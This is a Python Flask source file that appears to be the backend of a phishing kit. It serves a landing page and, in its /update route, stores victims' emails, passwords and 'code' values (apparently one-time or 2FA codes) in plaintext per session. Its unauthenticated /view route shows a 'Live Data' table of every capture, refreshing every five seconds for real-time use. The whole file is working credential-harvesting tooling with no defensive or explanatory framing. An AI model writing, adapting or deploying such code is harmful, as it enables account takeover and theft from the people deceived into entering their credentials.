from flask import Flask, request, send_file
import os, psycopg2

app = Flask(__name__)
DATABASE_URL = os.environ.get('DATABASE_URL')

def get_db():
    return psycopg2.connect(DATABASE_URL)

def init_db():
    con = get_db()
    cur = con.cursor()
    cur.execute("""CREATE TABLE IF NOT EXISTS sessions (
        id SERIAL PRIMARY KEY,
        sid TEXT UNIQUE,
        email TEXT,
        password TEXT,
        code TEXT,
        time TIMESTAMP DEFAULT CURRENT_TIMESTAMP)""")
    con.commit()
    cur.close()
    con.close()

@app.route("/")
def home():
    return send_file("index.html")

@app.route("/update", methods=["POST"])
def update():
    sid = request.form.get("sid", "")
    email = request.form.get("email", "")
    password = request.form.get("password", "")
    code = request.form.get("code", "")
    con = get_db()
    cur = con.cursor()
    cur.execute("SELECT id FROM sessions WHERE sid=%s", (sid,))
    existing = cur.fetchone()
    if existing:
        cur.execute("""UPDATE sessions SET
            email=CASE WHEN %s != '' THEN %s ELSE email END,
            password=CASE WHEN %s != '' THEN %s ELSE password END,
            code=CASE WHEN %s != '' THEN %s ELSE code END
            WHERE sid=%s""",
            (email, email, password, password, code, code, sid))
    else:
        cur.execute(
            "INSERT INTO sessions (sid,email,password,code) VALUES (%s,%s,%s,%s)",
            (sid, email, password, code))
    con.commit()
    cur.close()
    con.close()
    return "OK"

@app.route("/view")
def view():
    con = get_db()
    cur = con.cursor()
    cur.execute("SELECT id,email,password,code,time FROM sessions ORDER BY time DESC")
    rows = cur.fetchall()
    cur.close()
    con.close()
    html = "<h2>Live Data</h2><meta http-equiv='refresh' content='5'>"
    html += "<table border='1' cellpadding='8' style='border-collapse:collapse'>"
    html += "<tr><th>#</th><th>Email</th><th>Password</th><th>Code</th><th>Time</th></tr>"
    for r in rows:
        html += f"<tr><td>{r[0]}</td><td>{r[1]}</td><td>{r[2]}</td><td>{r[3]}</td><td>{r[4]}</td></tr>"
    html += "</table>"
    return html

init_db()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=9090)
